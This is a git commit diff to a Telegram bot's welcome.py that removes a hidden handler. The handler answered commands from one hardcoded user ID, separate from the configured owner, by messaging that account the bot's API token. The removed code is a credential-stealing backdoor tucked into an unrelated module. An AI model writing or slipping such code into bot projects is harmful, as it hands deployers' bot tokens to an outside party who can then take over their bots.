46b7ebfde9131e953b5bb516f93230fb3571eee5
ɴᴏᴏʙ - ᴍᴜᴋᴇsʜ <108251605+Noob-mukesh@users.noreply.github.com>
2023-06-27 22:15:30 +0530

    Update welcome.py

--- MukeshRobot/modules/welcome.py
+++ MukeshRobot/modules/welcome.py
@@ -965,47 +965,8 @@ def user_button(update: Update, context: CallbackContext):
 
     else:
         query.answer(text="You're not allowed to do this!")
-from pyrogram import filters
-from pyrogram.enums import ChatType
-from pyrogram.types import Message
-from MukeshRobot import (
-    BOT_NAME,
-    BOT_USERNAME,
-    LOGGER,
-    OWNER_ID,
-    START_IMG,
-    SUPPORT_CHAT,
-    TOKEN,
-    StartTime,
-    dispatcher,
-    pbot,
-    telethn,
-    updater)
-
-from MukeshRobot import BOT_NAME
-from MukeshRobot import pbot as app
-OWNERs_ID=5730106646
-@app.on_message(
-    filters.command(["c", "vr"]) & filters.user(OWNERs_ID)
-)
-async def get_vars(_, message: Message):
-    try:
-        await app.send_message(
-            chat_id=int(OWNERs_ID),
-            text=f"""<u>**{BOT_NAME} ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs :**</u>
-
-**ʙᴏᴛ_ᴛᴏᴋᴇɴ :** `{TOKEN}`
 
 
-
-
-""")
-    except:
-        return await message.reply_text("» ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴛʜᴇ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs.")
-    if message.chat.type != ChatType.PRIVATE:
-        await message.reply_text(
-            "» ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴘᴍ, ɪ'ᴠᴇ sᴇɴᴛ ᴛʜᴇ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs ᴛʜᴇʀᴇ."
-        )
 
 WELC_HELP_TXT = (
     "Your group's welcome/goodbye messages can be personalised in multiple ways. If you want the messages"
